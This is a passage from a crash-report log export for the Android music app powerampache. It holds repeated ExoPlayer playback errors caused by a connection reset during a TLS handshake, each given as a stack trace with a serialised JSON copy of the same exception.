reset"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":370,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":709,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":236,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
xgwVs8T0,2025-07-19T19:38:35.990,powerampache,PHP,Saturday 19th of July 2025 12:38:36 PM CDT,"1.01-76 (76) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:709)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loop(Looper.java:236)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.datasource.HttpDataSource$HttpDataSourceException: java.net.SocketException: Connection reset
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:370)
	at androidx.media3.datasource.DefaultDataSource.open(DefaultDataSource.java:275)
	at androidx.media3.datasource.StatsDataSource.open(StatsDataSource.java:87)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1085)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
	at java.lang.Thread.run(Thread.java:923)
Caused by: java.net.SocketException: Connection reset
	at java.net.SocketInputStream.read(SocketInputStream.java:215)
	at java.net.SocketInputStream.read(SocketInputStream.java:144)
	at com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream.readFromSocket(ConscryptEngineSocket.java:936)
	at com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream.processDataFromSocket(ConscryptEngineSocket.java:900)
	at com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream.access$100(ConscryptEngineSocket.java:722)
	at com.android.org.conscrypt.ConscryptEngineSocket.doHandshake(ConscryptEngineSocket.java:238)
	at com.android.org.conscrypt.ConscryptEngineSocket.startHandshake(ConscryptEngineSocket.java:217)
	at com.android.okhttp.internal.io.RealConnection.connectTls(RealConnection.java:196)
	at com.android.okhttp.internal.io.RealConnection.connectSocket(RealConnection.java:153)
	at com.android.okhttp.internal.io.RealConnection.connect(RealConnection.java:116)
	at com.android.okhttp.internal.http.StreamAllocation.findConnection(StreamAllocation.java:186)
	at com.android.okhttp.internal.http.StreamAllocation.findHealthyConnection(StreamAllocation.java:128)
	at com.android.okhttp.internal.http.StreamAllocation.newStream(StreamAllocation.java:97)
	at com.android.okhttp.internal.http.HttpEngine.connect(HttpEngine.java:289)
	at com.android.okhttp.internal.http.HttpEngine.sendRequest(HttpEngine.java:232)
	at com.android.okhttp.internal.huc.HttpURLConnectionImpl.execute(HttpURLConnectionImpl.java:465)
	at com.android.okhttp.internal.huc.HttpURLConnectionImpl.connect(HttpURLConnectionImpl.java:131)
	at com.android.okhttp.internal.huc.DelegatingHttpsURLConnection.connect(DelegatingHttpsURLConnection.java:90)
	at com.android.okhttp.internal.huc.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:30)
	at androidx.media3.datasource.DefaultHttpDataSource.makeConnection(DefaultHttpDataSource.java:644)
	at androidx.media3.datasource.DefaultHttpDataSource.makeConnection(DefaultHttpDataSource.java:525)
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:364)
	... 7 more

onPlayerError HttpDataSourceException - PlaybackException 
Error Code: 2001. Erreur lors de la lecture de ce morceau.
{""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":72},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":2001,""extras"":{""mMap"":{}},""timestampMs"":167908703,""cause"":{""dataSpec"":{""absoluteStreamPosition"":0,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""length"":-1,""position"":0,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2001,""cause"":{""detailMessage"":""Connection reset"",""stackTrace"":[{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":215,""methodName"":""read""},{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":144,""methodName"":""read""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":936,""methodName"":""readFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":900,""methodName"":""processDataFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":722,""methodName"":""access$100""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":238,""methodName"":""doHandshake""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":217,""methodName"":""startHandshake""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":196,""methodName"":""connectTls""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":153,""methodName"":""connectSocket""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":116,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":186,""methodName"":""findConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":128,""methodName"":""findHealthyConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":97,""methodName"":""newStream""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":289,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":232,""methodName"":""sendRequest""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":465,""methodName"":""execute""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":131,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.DelegatingHttpsURLConnection"",""fileName"":""DelegatingHttpsURLConnection.java"",""lineNumber"":90,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpsURLConnectionImpl"",""fileName"":""HttpsURLConnectionImpl.java"",""lineNumber"":30,""methodName"":""connect""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":644,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":525,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":364,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""java.net.SocketException: Connection reset"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":370,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":709,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":236,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}
 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":72},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":2001,""extras"":{""mMap"":{}},""timestampMs"":167908703,""cause"":{""dataSpec"":{""absoluteStreamPosition"":0,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""length"":-1,""position"":0,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2001,""cause"":{""detailMessage"":""Connection reset"",""stackTrace"":[{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":215,""methodName"":""read""},{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":144,""methodName"":""read""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":936,""methodName"":""readFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":900,""methodName"":""processDataFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":722,""methodName"":""access$100""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":238,""methodName"":""doHandshake""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":217,""methodName"":""startHandshake""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":196,""methodName"":""connectTls""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":153,""methodName"":""connectSocket""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":116,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":186,""methodName"":""findConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":128,""methodName"":""findHealthyConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":97,""methodName"":""newStream""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":289,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":232,""methodName"":""sendRequest""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":465,""methodName"":""execute""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":131,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.DelegatingHttpsURLConnection"",""fileName"":""DelegatingHttpsURLConnection.java"",""lineNumber"":90,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpsURLConnectionImpl"",""fileName"":""HttpsURLConnectionImpl.java"",""lineNumber"":30,""methodName"":""connect""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":644,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":525,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":364,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""java.net.SocketException: Connection reset"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":370,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":709,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":236,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
MYpPc61v,2025-07-19T19:38:32.690,powerampache,PHP,Saturday 19th of July 2025 12:38:33 PM CDT,"1.01-76 (76) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:709)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loop(Looper.java:236)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.datasource.HttpDataSource$HttpDataSourceException: java.net.SocketException: Connection reset
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:370)
	at androidx.media3.datasource.DefaultDataSource.open(DefaultDataSource.java:275)
	at androidx.media3.datasource.StatsDataSource.open(StatsDataSource.java:87)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1085)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
	at java.lang.Thread.run(Thread.java:923)
Caused by: java.net.SocketException: Connection reset
	at java.net.SocketInputStream.read(SocketInputStream.java:215)
	at java.net.SocketInputStream.read(SocketInputStream.java:144)
	at com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream.readFromSocket(ConscryptEngineSocket.java:936)
	at com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream.processDataFromSocket(ConscryptEngineSocket.java:900)
	at com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream.access$100(ConscryptEngineSocket.java:722)
	at com.android.org.conscrypt.ConscryptEngineSocket.doHandshake(ConscryptEngineSocket.java:238)
	at com.android.org.conscrypt.ConscryptEngineSocket.startHandshake(ConscryptEngineSocket.java:217)
	at com.android.okhttp.internal.io.RealConnection.connectTls(RealConnection.java:196)
	at com.android.okhttp.internal.io.RealConnection.connectSocket(RealConnection.java:153)
	at com.android.okhttp.internal.io.RealConnection.connect(RealConnection.java:116)
	at com.android.okhttp.internal.http.StreamAllocation.findConnection(StreamAllocation.java:186)
	at com.android.okhttp.internal.http.StreamAllocation.findHealthyConnection(StreamAllocation.java:128)
	at com.android.okhttp.internal.http.StreamAllocation.newStream(StreamAllocation.java:97)
	at com.android.okhttp.internal.http.HttpEngine.connect(HttpEngine.java:289)
	at com.android.okhttp.internal.http.HttpEngine.sendRequest(HttpEngine.java:232)
	at com.android.okhttp.internal.huc.HttpURLConnectionImpl.execute(HttpURLConnectionImpl.java:465)
	at com.android.okhttp.internal.huc.HttpURLConnectionImpl.connect(HttpURLConnectionImpl.java:131)
	at com.android.okhttp.internal.huc.DelegatingHttpsURLConnection.connect(DelegatingHttpsURLConnection.java:90)
	at com.android.okhttp.internal.huc.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:30)
	at androidx.media3.datasource.DefaultHttpDataSource.makeConnection(DefaultHttpDataSource.java:644)
	at androidx.media3.datasource.DefaultHttpDataSource.makeConnection(DefaultHttpDataSource.java:525)
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:364)
	... 7 more

onPlayerError HttpDataSourceException - PlaybackException 
Error Code: 2001. Erreur lors de la lecture de ce morceau.
{""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":72},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":2001,""extras"":{""mMap"":{}},""timestampMs"":167905397,""cause"":{""dataSpec"":{""absoluteStreamPosition"":0,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""length"":-1,""position"":0,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2001,""cause"":{""detailMessage"":""Connection reset"",""stackTrace"":[{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":215,""methodName"":""read""},{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":144,""methodName"":""read""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":936,""methodName"":""readFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":900,""methodName"":""processDataFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":722,""methodName"":""access$100""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":238,""methodName"":""doHandshake""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":217,""methodName"":""startHandshake""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":196,""methodName"":""connectTls""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":153,""methodName"":""connectSocket""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":116,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":186,""methodName"":""findConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":128,""methodName"":""findHealthyConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":97,""methodName"":""newStream""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":289,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":232,""methodName"":""sendRequest""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":465,""methodName"":""execute""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":131,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.DelegatingHttpsURLConnection"",""fileName"":""DelegatingHttpsURLConnection.java"",""lineNumber"":90,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpsURLConnectionImpl"",""fileName"":""HttpsURLConnectionImpl.java"",""lineNumber"":30,""methodName"":""connect""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":644,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":525,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":364,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""java.net.SocketException: Connection reset"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":370,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source 